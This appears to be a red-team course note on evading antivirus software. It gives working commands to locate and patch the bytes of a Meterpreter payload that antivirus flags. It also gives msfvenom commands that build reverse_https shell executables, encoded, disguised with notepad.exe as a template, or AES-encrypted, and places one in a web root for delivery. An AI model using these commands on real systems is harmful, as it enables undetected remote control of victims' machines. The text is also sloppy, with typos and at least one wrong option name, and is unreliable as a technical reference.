## Antivirus overview
  Most antivirus software runs on an endpoint machine. They offer real-time scan, in which the software monitors file operations and scans a file when it is downloaded or an attempt is made to execute it. In either case, if a malicious file is detected, it is either deleted or quarantined. Most detection is signature-based, rely on MD5 or SHA-1 hashes of malicious files or on unique byte sequences discovered in known malicious files. Some software also performs heuristics or behavioral analysis that simulates execution of a scanned file.
  
  When preparing for an engagement, we ideally want to mirror the target system in our local environment to verify the effectiveness of our tools. Since, red team is super cheap, we can't build a test environment for every engagement. Therefor, we could test payload against[AntiScanMe](https://antiscan.me/). They do Not distribute result.
  
## Baby Steps to bypass AV
We can use [FindAVSig](/04FunWithAntivirus/Find-AVSignature.ps1) powershell script to spilt our payload, and scan each section of our payload individully to identify which byte are flaged by AV. The below code spilt met.exe into 10000 bytes same files. We can use windows defender or any AV product to scan them individully, to see which section get flagged. Once you find the section, break it down again with smaller interval until you find the exact byte. Once you find the byte that get flagged, you can replace it using [bytechange script](/04FunWithAntivirus/bytechange.ps1) Hint,Sometimes, modifying the byte at the exact offset will not evade the signature, but modifying the byte before or after it will. And don't forget, you want to test the payload, sometime modification will mess up the payload..
```
PS C:\nonosquare> Import-Module .\Find-AVSignature.ps1
PS C:\nonosquare> Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path C:\nonosquare\met.exe -OutPath C:\nonosquare\avtest1 -Verbose -Force
```
Let's say if the second 20000 byte get flagged, we can break down agin with small interval, and scan again.
```
Find-AVSignature -StartByte 10000 -EndByte 20000 -Interval 1000 -Path C:\nonosquare\met.exe -OutPath C:\nonosquare\avtest1 -Verbose -Force
```

## play with Encoder or Encryptors
Encoders generally used character substitution to replace bad characters
```
kali@kali:~$ msfvenom --list encoders

Name Rank Description
---- ---- -----------
x64/xor normal XOR Encoder
x64/xor_context normal Hostname-based Context Keyed Payload
Encoder
x64/xor_dynamic normal Dynamic key XOR Encoder
x64/zutto_dekiru manual Zutto Dekiru
x86/add_sub manual Add/Sub Encoder
x86/alpha_mixed low Alpha2 Alphanumeric Mixedcase Encoder
```

Encoder Useage
```
kali@kali:~$ sudo msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=443 -e x86/shikata_ga_nai -f exe -o /var/www/html/met.exe
```

Enconder using Windows application as a template, copy C:\Windows\System32\notepad.exe to Kali and use it as a template
```
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -e x64/zutto_dekiru -x /home/kali/notepad.exe -f exe -o met64_notepad.exe
```

Encryption is design to replace to ineffectiveness of encoders for antivirus evasion
```
kali@kali:~$ msfvenom --list encrypt
================================================
Name
----
aes256
base64
rc4
xor
```

Let's encrypt with AES and see
```
kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP PORT=443 --encrypt aes256 --encrypt-key fdgdgj93traskfaswergfsdfg33 -f exe -o met64_aes.exe
```
